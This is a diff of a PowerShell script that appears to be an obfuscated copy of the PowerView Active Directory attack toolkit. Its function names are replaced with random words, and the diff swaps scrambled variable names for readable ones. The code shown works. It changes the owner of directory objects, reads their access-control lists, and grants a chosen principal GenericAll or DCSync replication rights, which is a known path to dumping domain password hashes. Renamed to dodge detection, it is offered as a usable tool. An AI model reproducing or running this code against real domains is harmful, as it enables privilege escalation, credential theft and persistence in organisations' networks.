-            $IJRNbRsV99 = [System.Security.Principal.SecurityIdentifier]$PqVjzRLd99
+        $SearcherArguments = @{}
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $OwnerSid = dermatitis @SearcherArguments -Identity $OwnerIdentity -Properties objectsid | Select-Object -ExpandProperty objectsid
+        if ($OwnerSid) {
+            $OwnerIdentityReference = [System.Security.Principal.SecurityIdentifier]$OwnerSid
         }
         else {
-            Write-Warning "[Lafitte] Error parsing owner identity '$FXydyfnV99'"
+            Write-Warning "[stript] Error parsing owner identity '$OwnerIdentity'"
         }
     }
     PROCESS {
-        if ($IJRNbRsV99) {
-            $PPosolen99['Raw'] = $True
-            $PPosolen99['Identity'] = $BfpbWwpi99
-            $FHZdVnWh99 = farrowing @SearcherArguments
-            ForEach ($Object in $FHZdVnWh99) {
+        if ($OwnerIdentityReference) {
+            $SearcherArguments['Raw'] = $True
+            $SearcherArguments['Identity'] = $Identity
+            $RawObject = dermatitis @SearcherArguments
+            ForEach ($Object in $RawObject) {
                 try {
-                    Write-Verbose "[Lafitte] Attempting to set the owner for '$BfpbWwpi99' to '$FXydyfnV99'"
-                    $Entry = $FHZdVnWh99.GetDirectoryEntry()
+                    Write-Verbose "[stript] Attempting to set the owner for '$Identity' to '$OwnerIdentity'"
+                    $Entry = $RawObject.GetDirectoryEntry()
                     $Entry.PsBase.Options.SecurityMasks = 'Owner'
-                    $Entry.PsBase.ObjectSecurity.SetOwner($IJRNbRsV99)
+                    $Entry.PsBase.ObjectSecurity.SetOwner($OwnerIdentityReference)
                     $Entry.PsBase.CommitChanges()
                 }
                 catch {
-                    Write-Warning "[Lafitte] Error setting owner: $_"
+                    Write-Warning "[stript] Error setting owner: $_"
                 }
             }
         }
     }
 }
-function pols {
+function Pearl {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.ACL')]
     [CmdletBinding()]
@@ -3819,165 +3819,165 @@ function pols {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('DistinguishedName', 'SamAccountName', 'Name')]
         [String[]]
-        $BfpbWwpi99,
+        $Identity,
         [Switch]
         $Sacl,
         [Switch]
-        $wZrotwTh99,
+        $ResolveGUIDs,
         [String]
         [Alias('Rights')]
         [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
-        $weQLqZWd99,
+        $RightsFilter,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $PPosolen99 = @{
+        $SearcherArguments = @{
             'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
         }
         if ($PSBoundParameters['Sacl']) {
-            $PPosolen99['SecurityMasks'] = 'Sacl'
+            $SearcherArguments['SecurityMasks'] = 'Sacl'
         }
         else {
-            $PPosolen99['SecurityMasks'] = 'Dacl'
+            $SearcherArguments['SecurityMasks'] = 'Dacl'
         }
-        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
-        $TbkLYEaJ99 = watersides @SearcherArguments
-        $wzHlWvRf99 = @{}
-        if ($PSBoundParameters['Domain']) { $wzHlWvRf99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['Server']) { $wzHlWvRf99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['ResultPageSize']) { $wzHlWvRf99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $wzHlWvRf99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Credential']) { $wzHlWvRf99['Credential'] = $gxazvivN99 }
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $Searcher = deadly @SearcherArguments
+        $DomainGUIDMapArguments = @{}
+        if ($PSBoundParameters['Domain']) { $DomainGUIDMapArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Server']) { $DomainGUIDMapArguments['Server'] = $Server }
+        if ($PSBoundParameters['ResultPageSize']) { $DomainGUIDMapArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $DomainGUIDMapArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Credential']) { $DomainGUIDMapArguments['Credential'] = $Credential }
         if ($PSBoundParameters['ResolveGUIDs']) {
-            $GUIDs = fault @DomainGUIDMapArguments
+            $GUIDs = accommodated @DomainGUIDMapArguments
         }
     }
     PROCESS {
-        if ($TbkLYEaJ99) {
-            $afFJXkRc99 = ''
-            $kXbEpVCq99 = ''
-            $BfpbWwpi99 | Where-Object {$_} | ForEach-Object {
-                $QghnbJOP99 = $_.Replace('(', '\28').Replace(')', '\29')
-                if ($QghnbJOP99 -match '^S-1-.*') {
-                    $afFJXkRc99 += "(objectsid=$QghnbJOP99)"
+        if ($Searcher) {
+            $IdentityFilter = ''
+            $Filter = ''
+            $Identity | Where-Object {$_} | ForEach-Object {
+                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
+                if ($IdentityInstance -match '^S-1-.*') {
+                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                 }
-                elseif ($QghnbJOP99 -match '^(CN|OU|DC)=.*') {
-                    $afFJXkRc99 += "(distinguishedname=$QghnbJOP99)"
+                elseif ($IdentityInstance -match '^(CN|OU|DC)=.*') {
+                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                     if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
-                        $BvhyhWZG99 = $QghnbJOP99.SubString($QghnbJOP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                        Write-Verbose "[pols] Extracted domain '$BvhyhWZG99' from '$QghnbJOP99'"
-                        $PPosolen99['Domain'] = $BvhyhWZG99
-                        $TbkLYEaJ99 = watersides @SearcherArguments
-                        if (-not $TbkLYEaJ99) {
-                            Write-Warning "[pols] Unable to retrieve domain searcher for '$BvhyhWZG99'"
+                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                        Write-Verbose "[Pearl] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                        $SearcherArguments['Domain'] = $IdentityDomain
+                        $Searcher = deadly @SearcherArguments
+                        if (-not $Searcher) {
+                            Write-Warning "[Pearl] Unable to retrieve domain searcher for '$IdentityDomain'"
                         }
                     }
                 }
-                elseif ($QghnbJOP99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
-                    $DwsqqDxI99 = (([Guid]$QghnbJOP99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
-                    $afFJXkRc99 += "(objectguid=$DwsqqDxI99)"
+                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
+                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
+                    $IdentityFilter += "(objectguid=$GuidByteString)"
                 }
-                elseif ($QghnbJOP99.Contains('.')) {
-                    $afFJXkRc99 += "(|(samAccountName=$QghnbJOP99)(name=$QghnbJOP99)(dnshostname=$QghnbJOP99))"
+                elseif ($IdentityInstance.Contains('.')) {
+                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                 }
                 else {
-                    $afFJXkRc99 += "(|(samAccountName=$QghnbJOP99)(name=$QghnbJOP99)(displayname=$QghnbJOP99))"
+                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                 }
             }
-            if ($afFJXkRc99 -and ($afFJXkRc99.Trim() -ne '') ) {
-                $kXbEpVCq99 += "(|$afFJXkRc99)"
+            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
+                $Filter += "(|$IdentityFilter)"
             }
             if ($PSBoundParameters['LDAPFilter']) {
-                Write-Verbose "[pols] Using additional LDAP filter: $HOOTOEqu99"
-                $kXbEpVCq99 += "$HOOTOEqu99"
+                Write-Verbose "[Pearl] Using additional LDAP filter: $LDAPFilter"
+                $Filter += "$LDAPFilter"
             }
-            if ($kXbEpVCq99) {
-                $TbkLYEaJ99.filter = "(&$kXbEpVCq99)"
+            if ($Filter) {
+                $Searcher.filter = "(&$Filter)"
             }
-            Write-Verbose "[pols] pols filter string: $($TbkLYEaJ99.filter)"
-            $pfqXXMQd99 = $TbkLYEaJ99.FindAll()
-            $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
+            Write-Verbose "[Pearl] Pearl filter string: $($Searcher.filter)"
+            $Results = $Searcher.FindAll()
+            $Results | Where-Object {$_} | ForEach-Object {
                 $Object = $_.Properties
                 if ($Object.objectsid -and $Object.objectsid[0]) {
-                    $vEAcbmpj99 = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
+                    $ObjectSid = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                 }
                 else {
-                    $vEAcbmpj99 = $Null
+                    $ObjectSid = $Null
                 }
                 try {
                     New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($PSBoundParameters['Sacl']) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
                         if ($PSBoundParameters['RightsFilter']) {
-                            $eJMVdcvK99 = Switch ($weQLqZWd99) {
+                            $GuidFilter = Switch ($RightsFilter) {
                                 'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                                 'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                                 Default { '00000000-0000-0000-0000-000000000000' }
                             }
-                            if ($_.ObjectType -eq $eJMVdcvK99) {
+                            if ($_.ObjectType -eq $GuidFilter) {
                                 $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
-                                $_ | Add-Member NoteProperty 'ObjectSID' $vEAcbmpj99
-                                $QNmOTPuW99 = $True
+                                $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid
+                                $Continue = $True
                             }
                         }
                         else {
                             $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
-                            $_ | Add-Member NoteProperty 'ObjectSID' $vEAcbmpj99
-                            $QNmOTPuW99 = $True
+                            $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid
+                            $Continue = $True
                         }
-                        if ($QNmOTPuW99) {
+                        if ($Continue) {
                             $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                             if ($GUIDs) {
-                                $LYKVxRFW99 = @{}
+                                $AclProperties = @{}
                                 $_.psobject.properties | ForEach-Object {
                                     if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                         try {
-                                            $LYKVxRFW99[$_.Name] = $GUIDs[$_.Value.toString()]
+                                            $AclProperties[$_.Name] = $GUIDs[$_.Value.toString()]
                                         }
                                         catch {
-                                            $LYKVxRFW99[$_.Name] = $_.Value
+                                            $AclProperties[$_.Name] = $_.Value
                                         }
                                     }
                                     else {
-                                        $LYKVxRFW99[$_.Name] = $_.Value
+                                        $AclProperties[$_.Name] = $_.Value
                                     }
                                 }
-                                $epqYIHWM99 = New-Object -TypeName PSObject -Property $LYKVxRFW99
-                                $epqYIHWM99.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
-                                $epqYIHWM99
+                                $OutObject = New-Object -TypeName PSObject -Property $AclProperties
+                                $OutObject.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
+                                $OutObject
                             }
                             else {
                                 $_.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
@@ -3987,265 +3987,265 @@ function pols {
                     }
                 }
                 catch {
-                    Write-Verbose "[pols] Error: $_"
+                    Write-Verbose "[Pearl] Error: $_"
                 }
             }
         }
     }
 }
-function requirements {
+function categorize {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [CmdletBinding()]
     Param (
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('DistinguishedName', 'SamAccountName', 'Name')]
         [String[]]
-        $ImYRLJwd99,
+        $TargetIdentity,
         [ValidateNotNullOrEmpty()]
         [String]
-        $IayDthuO99,
+        $TargetDomain,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $uvdgMODF99,
+        $TargetLDAPFilter,
         [ValidateNotNullOrEmpty()]
         [String]
-        $CpraPbHA99,
+        $TargetSearchBase,
         [Parameter(Mandatory = $True)]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $yhJclZId99,
+        $PrincipalIdentity,
         [ValidateNotNullOrEmpty()]
         [String]
-        $fcfzDfVI99,
+        $PrincipalDomain,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
+        $Credential = [Management.Automation.PSCredential]::Empty,
         [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
         [String]
-        $uDyzYPFx99 = 'All',
+        $Rights = 'All',
         [Guid]
-        $ttBmZLHk99
+        $RightsGUID
     )
     BEGIN {
-        $MLmKnjod99 = @{
+        $TargetSearcherArguments = @{
             'Properties' = 'distinguishedname'
             'Raw' = $True
         }
-        if ($PSBoundParameters['TargetDomain']) { $MLmKnjod99['Domain'] = $IayDthuO99 }
-        if ($PSBoundParameters['TargetLDAPFilter']) { $MLmKnjod99['LDAPFilter'] = $uvdgMODF99 }
-        if ($PSBoundParameters['TargetSearchBase']) { $MLmKnjod99['SearchBase'] = $CpraPbHA99 }
-        if ($PSBoundParameters['Server']) { $MLmKnjod99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $MLmKnjod99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $MLmKnjod99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $MLmKnjod99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $MLmKnjod99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $MLmKnjod99['Credential'] = $gxazvivN99 }
-        $hBSkMWAr99 = @{
-            'Identity' = $yhJclZId99
+        if ($PSBoundParameters['TargetDomain']) { $TargetSearcherArguments['Domain'] = $TargetDomain }
+        if ($PSBoundParameters['TargetLDAPFilter']) { $TargetSearcherArguments['LDAPFilter'] = $TargetLDAPFilter }
+        if ($PSBoundParameters['TargetSearchBase']) { $TargetSearcherArguments['SearchBase'] = $TargetSearchBase }
+        if ($PSBoundParameters['Server']) { $TargetSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $TargetSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $TargetSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $TargetSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $TargetSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $TargetSearcherArguments['Credential'] = $Credential }
+        $PrincipalSearcherArguments = @{
+            'Identity' = $PrincipalIdentity
             'Properties' = 'distinguishedname,objectsid'
         }
-        if ($PSBoundParameters['PrincipalDomain']) { $hBSkMWAr99['Domain'] = $fcfzDfVI99 }
-        if ($PSBoundParameters['Server']) { $hBSkMWAr99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $hBSkMWAr99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $hBSkMWAr99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $hBSkMWAr99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $hBSkMWAr99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $hBSkMWAr99['Credential'] = $gxazvivN99 }
-        $sOpNNZru99 = farrowing @PrincipalSearcherArguments
-        if (-not $sOpNNZru99) {
-            throw "Unable to resolve principal: $yhJclZId99"
+        if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }
+        if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
+        $Principals = dermatitis @PrincipalSearcherArguments
+        if (-not $Principals) {
+            throw "Unable to resolve principal: $PrincipalIdentity"
         }
     }
     PROCESS {
-        $MLmKnjod99['Identity'] = $ImYRLJwd99
-        $khNNPamj99 = farrowing @TargetSearcherArguments
-        ForEach ($UAGfwAnC99 in $khNNPamj99) {
-            $ARVPipoY99 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
-            $CWTmfuAd99 = [System.Security.AccessControl.AccessControlType] 'Allow'
+        $TargetSearcherArguments['Identity'] = $TargetIdentity
+        $Targets = dermatitis @TargetSearcherArguments
+        ForEach ($TargetObject in $Targets) {
+            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
+            $ControlType = [System.Security.AccessControl.AccessControlType] 'Allow'
             $ACEs = @()
-            if ($ttBmZLHk99) {
-                $GUIDs = @($ttBmZLHk99)
+            if ($RightsGUID) {
+                $GUIDs = @($RightsGUID)
             }
             else {
-                $GUIDs = Switch ($uDyzYPFx99) {
+                $GUIDs = Switch ($Rights) {
                     'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                     'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                     'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                 }
             }
-            ForEach ($VSoDkQsP99 in $sOpNNZru99) {
-                Write-Verbose "[requirements] Granting principal $($VSoDkQsP99.distinguishedname) '$uDyzYPFx99' on $($UAGfwAnC99.Properties.distinguishedname)"
+            ForEach ($PrincipalObject in $Principals) {
+                Write-Verbose "[categorize] Granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname)"
                 try {
-                    $BfpbWwpi99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$VSoDkQsP99.objectsid)
+                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)
                     if ($GUIDs) {
                         ForEach ($GUID in $GUIDs) {
-                            $NQyWORBy99 = New-Object Guid $GUID
-                            $TiyiOPYY99 = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
-                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $BfpbWwpi99, $TiyiOPYY99, $CWTmfuAd99, $NQyWORBy99, $ARVPipoY99
+                            $NewGUID = New-Object Guid $GUID
+                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
+                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                         }
                     }
                     else {
-                        $TiyiOPYY99 = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
-                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $BfpbWwpi99, $TiyiOPYY99, $CWTmfuAd99, $ARVPipoY99
+                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
+                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                     }
                     ForEach ($ACE in $ACEs) {
-                        Write-Verbose "[requirements] Granting principal $($VSoDkQsP99.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($UAGfwAnC99.Properties.distinguishedname)"
-                        $jLkGSgjF99 = $UAGfwAnC99.GetDirectoryEntry()
-                        $jLkGSgjF99.PsBase.Options.SecurityMasks = 'Dacl'
-                        $jLkGSgjF99.PsBase.ObjectSecurity.AddAccessRule($ACE)
-                        $jLkGSgjF99.PsBase.CommitChanges()
+                        Write-Verbose "[categorize] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)"
+                        $TargetEntry = $TargetObject.GetDirectoryEntry()
+                        $TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
+                        $TargetEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
+                        $TargetEntry.PsBase.CommitChanges()
                     }
                 }
                 catch {
-                    Write-Verbose "[requirements] Error granting principal $($VSoDkQsP99.distinguishedname) '$uDyzYPFx99' on $($UAGfwAnC99.Properties.distinguishedname) : $_"
+                    Write-Verbose "[categorize] Error granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) : $_"
                 }
             }
         }
     }
 }
-function cheapens {
+function citric {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [CmdletBinding()]
     Param (
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('DistinguishedName', 'SamAccountName', 'Name')]
         [String[]]
-        $ImYRLJwd99,
+        $TargetIdentity,
         [ValidateNotNullOrEmpty()]
         [String]
-        $IayDthuO99,
+        $TargetDomain,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $uvdgMODF99,
+        $TargetLDAPFilter,
         [ValidateNotNullOrEmpty()]
         [String]
-        $CpraPbHA99,
+        $TargetSearchBase,
         [Parameter(Mandatory = $True)]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $yhJclZId99,
+        $PrincipalIdentity,
         [ValidateNotNullOrEmpty()]
         [String]
-        $fcfzDfVI99,
+        $PrincipalDomain,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
+        $Credential = [Management.Automation.PSCredential]::Empty,
         [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
         [String]
-        $uDyzYPFx99 = 'All',
+        $Rights = 'All',
         [Guid]
-        $ttBmZLHk99
+        $RightsGUID
     )
     BEGIN {
-        $MLmKnjod99 = @{
+        $TargetSearcherArguments = @{
             'Properties' = 'distinguishedname'
             'Raw' = $True
         }
-        if ($PSBoundParameters['TargetDomain']) { $MLmKnjod99['Domain'] = $IayDthuO99 }
-        if ($PSBoundParameters['TargetLDAPFilter']) { $MLmKnjod99['LDAPFilter'] = $uvdgMODF99 }
-        if ($PSBoundParameters['TargetSearchBase']) { $MLmKnjod99['SearchBase'] = $CpraPbHA99 }
-        if ($PSBoundParameters['Server']) { $MLmKnjod99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $MLmKnjod99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $MLmKnjod99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $MLmKnjod99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $MLmKnjod99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $MLmKnjod99['Credential'] = $gxazvivN99 }
-        $hBSkMWAr99 = @{
-            'Identity' = $yhJclZId99
+        if ($PSBoundParameters['TargetDomain']) { $TargetSearcherArguments['Domain'] = $TargetDomain }
+        if ($PSBoundParameters['TargetLDAPFilter']) { $TargetSearcherArguments['LDAPFilter'] = $TargetLDAPFilter }
+        if ($PSBoundParameters['TargetSearchBase']) { $TargetSearcherArguments['SearchBase'] = $TargetSearchBase }
+        if ($PSBoundParameters['Server']) { $TargetSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $TargetSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $TargetSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $TargetSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $TargetSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $TargetSearcherArguments['Credential'] = $Credential }
+        $PrincipalSearcherArguments = @{
+            'Identity' = $PrincipalIdentity
             'Properties' = 'distinguishedname,objectsid'
         }
-        if ($PSBoundParameters['PrincipalDomain']) { $hBSkMWAr99['Domain'] = $fcfzDfVI99 }
-        if ($PSBoundParameters['Server']) { $hBSkMWAr99['Server'] = $mSxqoOjK99 }
